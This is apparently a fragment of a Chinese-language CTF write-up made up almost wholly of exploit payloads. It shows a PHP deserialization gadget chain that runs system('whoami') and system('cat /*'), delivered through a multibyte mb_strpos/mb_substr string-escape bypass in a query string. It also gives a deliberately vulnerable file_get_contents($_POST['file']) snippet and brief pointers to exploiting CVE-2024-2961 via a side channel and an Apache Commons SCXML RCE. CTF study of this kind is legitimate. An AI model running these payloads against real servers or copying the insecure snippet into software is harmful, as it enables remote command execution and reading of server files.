a:2:{i:1;O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:17:"system("whoami");";}}}}}s:3:"end";s:6:"hacker";s:8:"username";R:9;}i:1;N;}
```

```
字符串逃逸mb_strpos和mb_substr对于字符性质差异绕过substrstr
```

```
?
substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc
%f0%9fab&ez[ser.from_you=a:2:{i:1;O:6:"Hacker":3:{s:5:"start";O:1:"C":1:
{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:
{s:1:"r";s:17:"system("whoami");";}}}}}s:3:"end";s:6:"hacker";s:8:"username";R:
9;}i:1;N;}
```

```
?substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9fab&ez[ser.from_you=a:2:{i:1;O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:17:"system("cat /*");";}}}}}s:3:"end";s:6:"hacker";s:8:"username";R:9;}i:1;N;}
```

#### Just Readme (前置)

```
<?php
echo file_get_contents($_POST['file']);
```

```
CVE-2024-2961
https://xz.aliyun.com/news/14986
```

#### Readme

```
测信道获取文件内容，然后打CVE-2024-2961。
```

#### scxml

```
https://blog.pyn3rd.com/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/
```

